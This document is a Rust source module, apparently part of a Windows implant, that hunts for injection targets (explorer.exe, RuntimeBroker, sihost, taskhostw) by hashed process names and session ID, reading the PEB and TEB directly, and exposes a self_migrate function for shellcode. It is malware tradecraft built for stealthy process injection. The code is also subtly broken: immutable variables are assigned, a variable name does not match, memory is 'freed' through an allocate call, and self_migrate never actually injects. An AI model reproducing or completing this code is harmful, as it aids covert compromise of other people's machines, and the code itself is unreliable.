use crate::core::types::*;
use crate::debug;
use crate::core::hashes;
use crate::core::nt;

use core::ffi::c_void;
use core::ptr::null_mut;

// Candidate host processes, orderd by preference
const CANDIDATES: &[u32] = &[
    hashes::EXPLORER_EXE_HASH,
    hashes::RUNTIMEBROKER_EXE_HASH,
    hashes::SIHOST_EXE_HASH,
    hashes::TASKHOSTW_EXE_HASH,
];

unsafe fn get_own_session_id() -> u32 { unsafe {
    let peb: u64;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    if peb == 0 {
        return 0;
    }
    *((peb as usize + 0x2C0) as *const u32)
}}

unsafe fn get_own_pid() -> usize { unsafe {
    let teb: u64;
    core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb); // TEB.ClientId is at offset 0x40, UniqueProcess is the first field (8 bytes on x64)
    *((teb as usize + 0x40) as *const usize)
}}

unsafe fn free_memory(mut buffer: *mut c_void) { unsafe {
    let mut free_size: usize = 0;
    nt::nt_allocate_virtual_memory(
        -1isize as HANDLE, 
        &mut buffer, 
        0, 
        &mut free_size, 
        0x00008000, // MEM_RELEASE
        0
    );
}}

unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [usize; 4] { unsafe {
    let result = [0usize; 4];
    let count = 0usize;

    // Allocate buffer for NtQuerySystemInformation(SystemProcessInfomration = 5)
    let mut buffer_size: u32 = 1024 * 256; // 256KB initial
    let mut buffer: *mut c_void;
    let mut return_length: u32 = 0;

    // get our PID to avoid self injection
    let _out_pid = get_own_pid();

    loop { 
        let mut size = buffer_size as usize;
        buffer = null_mut();
        let status = nt::nt_allocate_virtual_memory(
            -1isize as HANDLE,
            &mut buffer,
            0,
            &mut size,
            0x00001000 | 0x00002000,    // MEM_COMMIT | MEM_RESERVE
            0x04,                       // PAGE_READWRITE
        );
        if status != STATUS_SUCCESS || buffer.is_null() {
            return result;
        }

        let status = nt::nt_query_system_information(
            5, // SystemProcessInformation
            buffer,
            size as u32,
            &mut return_length,
        );
        if status == STATUS_SUCCESS {
            break;
        }

        free_memory(buffer);
        if status == 0xC0000004u32 as i32 {
            buffer_size = return_length + 4096; // STATUS_INFO_LENGTH_MISMATCH
        } else {
            return result;
        }
    }

    // Walk the linked list of SYSTEM_PROCESS_INFORMATION
    let mut entry = buffer as *const SystemProcessInformation;

    loop {
        let pid = (*entry).unique_process_id;

        // Skip System (PID 0/4) and our own process
        if pid > 4 && pid != our_pid && !(*entry).image_name.buffer.is_null() {
            let name_len = (*entry).image_name.length as usize / 2;
            let name = core::slice::from_raw_parts((*entry).image_name.buffer, name_len);

            let mut hash: u32 = hashes::HASH_SEED;
            for &wide in name {
                let byte = (wide & 0xFF) as u8;
                let c = if byte >= b'A' && byte <= b'Z' {
                    byte + 32 
                } else {
                    byte
                };
                hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
            }
            hash ^= hashes::HASH_SEED;

            if hash == target_hash {
                // Check session ID
                let session = (*entry).session_id;
                if session == required_session {
                    result[count] = pid;
                    count += 1;
                    if count >= 4 {
                        break
                    }
                }
            }
        }

        if (*entry).next_entry_offset == 0 {
            break;
        }
        entry = (entry as usize + (*entry).next_entry_offset as usize) as *const SystemProcessInformation;
    }

    free_memory(buffer);
    result
}}

pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
    if sehllcode.is_empty() {
        debug!("[MIGRATE] No Shellcode to inject");
        return false;
    }

    let our_session = get_own_session_id();
    for (idx, &hash) in CANDIDATES.iter().enumerate() {
        debug!("[MIGRATE] Trying target #{}", idx);
        let pids = find_processes_by_hash(hash, our_session);
        if pids[0] == 0 {
            debug!("[MIGRATE]   #{} - not found or worng session", idx);
            continue;
        }
    }
    
    true
}}
